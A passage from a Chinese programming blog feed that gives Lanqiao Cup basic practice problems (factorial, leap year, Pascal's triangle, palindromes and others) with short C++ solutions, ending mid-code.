首先将a设为1，然后乘2，乘3，当乘到n时，即得到了n!的值。</li><li>输入格式<br>　　输入包含一个正整数n，n&lt;=1000。</li><li>输出格式<br>　　输出n!的准确值。</li><li>样例输入<br> 10</li><li>样例输出<br> 3628800</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> arr = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, key=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>; i&lt;=n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;arr.length(); j++)</span><br><span class="line">        &#123;</span><br><span class="line">            key = (arr[j]-<span class="string">&#x27;0&#x27;</span>)*i + key;</span><br><span class="line">            arr[j] = key%<span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            key /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(key!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> flag[<span class="number">2</span>];</span><br><span class="line">            itoa(key % <span class="number">10</span>, flag, <span class="number">10</span>);</span><br><span class="line">            arr += flag;</span><br><span class="line">            key /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=arr.length()<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; arr[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      <categories>
          
          <category> Programma </category>
          
          <category> lanqiaobei </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Programma </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝桥杯 基础练习</title>
      <link href="2020/09/27/Programme/lanqiaobei/Basic-Algorithm/Basic-Algorithm/"/>
      <url>2020/09/27/Programme/lanqiaobei/Basic-Algorithm/Basic-Algorithm/</url>
      
        <content type="html"><![CDATA[<h1 id="BASIC-1-闰年判断"><a href="#BASIC-1-闰年判断" class="headerlink" title="BASIC-1   闰年判断"></a>BASIC-1   闰年判断</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li><p>资源限制<br>时间限制：1.0s   内存限制：256.0MB</p></li><li><p>问题描述<br> 给定一个年份，判断这一年是不是闰年。<br> 当以下情况之一满足时，这一年是闰年：</p><pre><code>1. 年份是4的倍数而不是100的倍数；2. 年份是400的倍数。</code></pre><p> 其他的年份都不是闰年。</p></li><li><p>输入格式<br> 输入包含一个整数y，表示当前的年份。</p></li><li><p>输出格式<br> 输出一行，如果给定的年份是闰年，则输出yes，否则输出no。<br> 说明：当试题指定你输出一个字符串作为结果（比如本题的yes或者no，你需要严格按照试题中给定的大小写，写错大小写将不得分。</p></li><li><p>样例输入<br> 2013</p></li><li><p>样例输出<br> no</p></li><li><p>样例输入<br> 2016</p></li><li><p>样例输出<br> yes</p></li><li><p>数据规模与约定<br> 1990 &lt;= y &lt;= 2050。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> year;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; year;</span><br><span class="line"><span class="keyword">if</span> ((year % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; year % <span class="number">100</span> != <span class="number">0</span>) || year % <span class="number">400</span> == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;no&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-2-01字串"><a href="#BASIC-2-01字串" class="headerlink" title="BASIC-2    01字串"></a>BASIC-2    01字串</h1><div class="tabs" id="test2"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test2-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test2-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test2-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：256.0MB</p></li><li><p>问题描述<br> 对于长度为5位的一个01串，每一位都可能是0或1，一共有32种可能。它们的前几个是：<br> 00000<br> 00001<br> 00010<br> 00011<br> 00100<br> 请按从小到大的顺序输出这32种01串。</p></li><li><p>输入格式<br> 本试题没有输入。</p></li><li><p>输出格式<br> 输出32行，按从小到大的顺序每行一个长度为5的01串。</p></li><li><p>样例输出<br> 00000<br> 00001<br> 00010<br> 00011<br> &lt;以下部分省略&gt;</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test2-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">2</span>; k++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; <span class="number">2</span>; l++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> m = <span class="number">0</span>; m &lt; <span class="number">2</span>; m++)</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; i &lt;&lt; j &lt;&lt; k &lt;&lt; l &lt;&lt; m &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-3-字母图形"><a href="#BASIC-3-字母图形" class="headerlink" title="BASIC-3    字母图形"></a>BASIC-3    字母图形</h1><div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test3-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test3-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test3-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：256.0MB</p></li><li><p>问题描述<br> 利用字母可以组成一些美丽的图形，下面给出了一个例子：<br> ABCDEFG<br> BABCDEF<br> CBABCDE<br> DCBABCD<br> EDCBABC<br> 这是一个5行7列的图形，请找出这个图形的规律，并输出一个n行m列的图形。</p></li><li><p>输入格式<br> 输入一行，包含两个整数n和m，分别表示你要输出的图形的行数的列数。</p></li><li><p>输出格式<br> 输出n行，每个m个字符，为你的图形。</p></li><li><p>样例输入<br> 5 7</p></li><li><p>样例输出<br> ABCDEFG<br> BABCDEF<br> CBABCDE<br> DCBABCD<br> EDCBABC</p></li><li><p>数据规模与约定<br> 1 &lt;= n, m &lt;= 26。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="string">&#x27;A&#x27;</span>, b;</span><br><span class="line"><span class="keyword">int</span> n, m, x;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">b = a + i;</span><br><span class="line">x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, b);</span><br><span class="line"><span class="keyword">if</span>(x)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(b &gt; a)</span><br><span class="line">b--;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">b++;</span><br><span class="line">x = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">b++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-4-数列特征"><a href="#BASIC-4-数列特征" class="headerlink" title="BASIC-4    数列特征"></a>BASIC-4    数列特征</h1><div class="tabs" id="test4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test4-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test4-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test4-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：256.0MB</p></li><li><p>问题描述<br> 给出n个数，找出这n个数的最大值，最小值，和。</p></li><li><p>输入格式<br> 第一行为整数n，表示数的个数。<br> 第二行有n个数，为给定的n个数，每个数的绝对值都小于10000。</p></li><li><p>输出格式<br> 输出三行，每行一个整数。第一行表示这些数中的最大值，第二行表示这些数中的最小值，第三行表示这些数的和。</p></li><li><p>样例输入<br> 5<br> 1 3 -2 4 5</p></li><li><p>样例输出<br> 5<br> -2<br> 11</p></li><li><p>数据规模与约定<br> 1 &lt;= n &lt;= 10000。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max, min, sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> n, number;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; number;</span><br><span class="line">        sum += number;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            max = number;</span><br><span class="line">            min = number;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (number &gt; max)</span><br><span class="line">            max = number;</span><br><span class="line">        <span class="keyword">if</span> (number &lt; min)</span><br><span class="line">            min = number;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; max &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; min &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-5-查找整数"><a href="#BASIC-5-查找整数" class="headerlink" title="BASIC-5    查找整数"></a>BASIC-5    查找整数</h1><div class="tabs" id="test5"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test5-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test5-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test5-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：256.0MB</p></li><li><p>问题描述<br> 给出一个包含n个整数的数列，问整数a在数列中的第一次出现是第几个。</p></li><li><p>输入格式<br> 第一行包含一个整数n。<br> 第二行包含n个非负整数，为给定的数列，数列中的每个数都不大于10000。<br> 第三行包含一个整数a，为待查找的数。</p></li><li><p>输出格式<br> 如果a在数列中出现了，输出它第一次出现的位置(位置从1开始编号)，否则输出-1。</p></li><li><p>样例输入<br> 6<br> 1 9 4 8 3 9<br> 9</p></li><li><p>样例输出<br> 2</p></li><li><p>数据规模与约定<br> 1 &lt;= n &lt;= 1000。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test5-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">1001</span>];</span><br><span class="line">    <span class="keyword">int</span> n, a, place=<span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; arr[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; a;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i] == a)</span><br><span class="line">        &#123;</span><br><span class="line">            place = i+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; place;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-6-杨辉三角形"><a href="#BASIC-6-杨辉三角形" class="headerlink" title="BASIC-6    杨辉三角形"></a>BASIC-6    杨辉三角形</h1><div class="tabs" id="test6"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test6-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test6-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test6-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：256.0MB</p></li><li><p>问题描述<br> 杨辉三角形又称Pascal三角形，它的第i+1行是(a+b)i的展开式的系数。<br> 它的一个重要性质是：三角形中的每个数字等于它两肩上的数字相加。　　<br> 下面给出了杨辉三角形的前4行：　</p><pre><code>1　</code></pre><p>   1 1<br>  1 2 1<br> 1 3 3 1　<br> 给出n，输出它的前n行。</p></li><li><p>输入格式<br> 输入包含一个数n。</p></li><li><p>输出格式<br> 输出杨辉三角形的前n行。每一行从这一行的第一个数开始依次输出，中间使用一个空格分隔。请不要在前面输出多余的空格。</p></li><li><p>样例输入<br> 4</p></li><li><p>样例输出<br> 1<br> 1 1<br> 1 2 1<br> 1 3 3 1</p></li><li><p>数据规模与约定<br> 1 &lt;= n &lt;= 34。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test6-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">35</span>][<span class="number">35</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i==j || j==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                arr[i][j] = <span class="number">1</span>;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="number">1</span> &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(i==j)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            arr[i][j] = arr[i<span class="number">-1</span>][j] + arr[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; arr[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-7-特殊的数字"><a href="#BASIC-7-特殊的数字" class="headerlink" title="BASIC-7    特殊的数字"></a>BASIC-7    特殊的数字</h1><div class="tabs" id="test7"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test7-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test7-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test7-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</p></li><li><p>问题描述<br>　　153是一个非常特殊的数，它等于它的每位数字的立方和，即153=1<em>1</em>1+5<em>5</em>5+3<em>3</em>3。编程求所有满足这种条件的三位十进制数。</p></li><li><p>输出格式<br>　　按从小到大的顺序输出满足条件的三位十进制数，每个数占一行。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test7-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a, b, c;                             </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">111</span>; i &lt; <span class="number">999</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a = i/<span class="number">100</span>;</span><br><span class="line">        b = (i/<span class="number">10</span>)%<span class="number">10</span>;</span><br><span class="line">        c = i%<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(i == a*a*a + b*b*b + c*c*c)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-8-回文数"><a href="#BASIC-8-回文数" class="headerlink" title="BASIC-8    回文数"></a>BASIC-8    回文数</h1><div class="tabs" id="test8"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test8-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test8-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test8-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</p></li><li><p>问题描述<br>　　1221是一个非常特殊的数，它从左边读和从右边读是一样的，编程求所有这样的四位十进制数。</p></li><li><p>输出格式<br>　　按从小到大的顺序输出满足条件的四位十进制数。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test8-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1000</span>; i &lt;= <span class="number">9999</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        